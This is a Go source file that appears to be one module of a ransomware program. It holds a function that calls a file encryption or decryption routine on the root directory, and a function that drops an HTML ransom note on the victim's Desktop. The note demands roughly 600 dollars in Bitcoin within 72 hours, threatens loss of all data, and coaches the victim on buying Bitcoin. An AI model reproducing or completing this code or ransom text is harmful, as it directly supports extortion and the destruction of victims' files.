package main

import (
	"io/ioutil"
	"os"
)

var price = 600

// End decrypts documets and exits
func End() {
	//Decrypt
	EncryptDocumets("/", false)
	os.Exit(0)
}

// PromtPay add note to desktop
func PromtPay() {
	/*
	*	Copy instructions to Desktop and opens it
	 */
	ioutil.WriteFile(os.Getenv("HOME")+string(os.PathSeparator)+"Desktop"+string(os.PathSeparator)+"Instructions.html", []byte(text), 0644)

}

var text = `<p><center><h1>ALL YOUR FILES HAS BEEN ENCRYPTED</br></h1></center></p>

<p>All your files have been encrypted using AES 256, there
is no way to detrypt them by yourself.</p>

<p>If you want to decrypt them you have to pay aproximatly <b>600$</b> in Bitcoins<br>
to the following address:</p>

<p>Amount: <b>` + string(price) + ` BTCs</b><br>
To the address: <b>` + BTC_ADDRESS + `</b></p>

<p>Do not worry if you don't know what bitcoins are, they are an online currency<br>
that is not regulated by any goverment, the price changes daily but now is near the 600$ usd dollars<br>
To get some bitcoins you can go to some of this web pages:</p>

<p> - <a href="http://www.coinbase.com">Coinbase</a><br>
 In this page you can store your bitcoins and also buy them using your credit card,<br>
 It is a safe page, you can chech it online if you aren't sure</p>

<p>- <a href="http://www.localbitcoins.com">localbitcoins.com</a> <br>
 This a web where people contact each others to exchange Bitcoins for money in paypal,<br>
 in cash if you find someone nearby and many other ways</p>

<p>I strongly recommend coinbase.com as you can be done un 15 minutes and your files will start decrypting<br>
I recommend you look for info online if you don't want to use coinbase.com</p>

<p>IT IS EXTREMELY IMPORTANT THAT YOU SEND THE EXACT AMMOUNT AND THAT THIS PROGRAM IS RUNNING <br>
WHILE YOU MAKE THE PAYMENT TO BE ABLE TO CONFIRM THE TRANSACTION.</p>

<p>If you can't figure out something send me an email to helpmedecrypt@protonmail.com<br>
You have 72 hours form now on to send the payment or you will lose all the data so don't <br>
wait to send an email if you don't know something.</p>

<p>I hope to hear from you soon.<br>
</p>`
